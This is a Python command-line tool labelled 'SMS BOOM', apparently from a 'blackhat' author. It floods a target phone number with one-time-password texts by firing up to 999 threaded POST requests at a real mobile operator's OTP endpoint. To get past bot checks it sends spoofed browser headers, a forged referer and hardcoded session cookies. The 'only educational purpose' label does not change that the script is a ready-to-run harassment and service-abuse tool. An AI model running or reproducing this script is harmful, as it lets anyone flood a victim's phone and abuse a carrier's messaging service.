import os
import requests
import time
from concurrent.futures import ThreadPoolExecutor

def clear_screen():

    os.system('clear' if os.name == 'posix' else 'cls')

def open_link(url):
    
    os.system('xdg-open ' + url)

def main_menu():
    while True:
        clear_screen()
        print("")
        print("\033[1;35m░██████╗███╗░░░███╗░██████╗")
        print("██╔════╝████╗░████║██╔════╝")
        print("╚█████╗░██╔████╔██║╚█████╗░")
        print("░╚═══██╗██║╚██╔╝██║░╚═══██╗")
        print("██████╔╝██║░╚═╝░██║██████╔╝")
        print("╚═════╝░╚═╝░░░░░╚═╝╚═════╝░")
        print ("")
        print("██████╗░░█████╗░░█████╗░███╗░░░███╗")
        print("██╔══██╗██╔══██╗██╔══██╗████╗░████║")
        print("██████╦╝██║░░██║██║░░██║██╔████╔██║")
        print("██╔══██╗██║░░██║██║░░██║██║╚██╔╝██║")
        print("██████╦╝╚█████╔╝╚█████╔╝██║░╚═╝░██║")
        print("╚═════╝░░╚════╝░░╚════╝░╚═╝░░░░░╚═╝\033[0m")
        print("\n\033[1;32mWelcome to My Tools🎉 I am Mr Jack \033[0m\n")

        print("\033[1;33m[1] SMS Booming")
        print("[2] Telegram Channel")
        print("[3] Facebook Profile\033[0m")
        print("\n\033[1;36mChoose an option: \033[0m", end="")
        choice = input()

        if choice == '1':
            sms_booming_tool()
        elif choice == '2':
            print("\n\033[1;32mRedirecting to Telegram...\033[0m")
            
            open_link('https://t.me/bdblackhat9')
            time.sleep(2)
        elif choice == '3':
            print("\n\033[1;32mRedirecting to Facebook...\033[0m")
            open_link('https://www.facebook.com/profile.php?id=100088791098400')
            time.sleep(2)
        else:
            print("\n\033[1;31mInvalid choice. Please try again.\033[0m")
            time.sleep(2)

def sms_booming_tool():
    clear_screen()
    print("\033[1;32mStarting SMS Booming Tool...\033[0m\n")

    # =======================
    # কোড চুরি করলে নুনু কেটে
    # দেওয়া হবে  😁
    # ========================
    while True:
        mobile_number = input("\033[1;33mEnter target mobile number +88: \033[0m")
        if mobile_number.isdigit() and len(mobile_number) >= 10:
            break
        else:
            print("\033[1;31mInvalid number! Please enter digits only.\033[0m")
    while True:
        try:
            num_requests = int(input("\033[1;33mChoose your SMS limit 10--999: \033[0m"))
            if num_requests > 0:
                break
            else:
                print("\033[1;31mNumber must be greater than 0.\033[0m")
        except ValueError:
            print("\033[1;31mPlease enter a valid number.\033[0m")

    url = "https://weblogin.grameenphone.com/backend/api/v1/otp"

    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9,ru;q=0.8,zh-TW;q=0.7,zh;q=0.6",
        "cache-control": "no-cache",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "origin": "https://efiling.ebmeb.gov.bd",
        "pragma": "no-cache",
        "priority": "u=1, i",
        "referer": "https://efiling.ebmeb.gov.bd/index.php/eiinsim/applicationform",
        "sec-ch-ua": '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
        "x-requested-with": "XMLHttpRequest",
    }

    cookies = {
        "__nobotA2": "CgAC02i8kXhmqgAHA5G1Ag==",
        "ci_session": "8dbada59b153e03dcdcfe05e90d3300b272992a9",
    }

    data = {
        "mobile": mobile_number
    }

    def send_request(i):
        try:
            response = requests.post(url, headers=headers, cookies=cookies, data=data)
            print(f"\033[1;32m[{i + 1}] SMS Sent...Done✔️ → only educational purpose   \033[0m")
        except Exception as e:
            print(f"\033[1;31m[{i + 1}] Error: {e}\033[0m")

    with ThreadPoolExecutor(max_workers=50) as executor:
        executor.map(send_request, range(num_requests))

    print("\n\033[1;36mSMS bombing complete! Press Enter to go back to the main menu.\033[0m")
    input()
    clear_screen()


if __name__ == "__main__":
    main_menu()
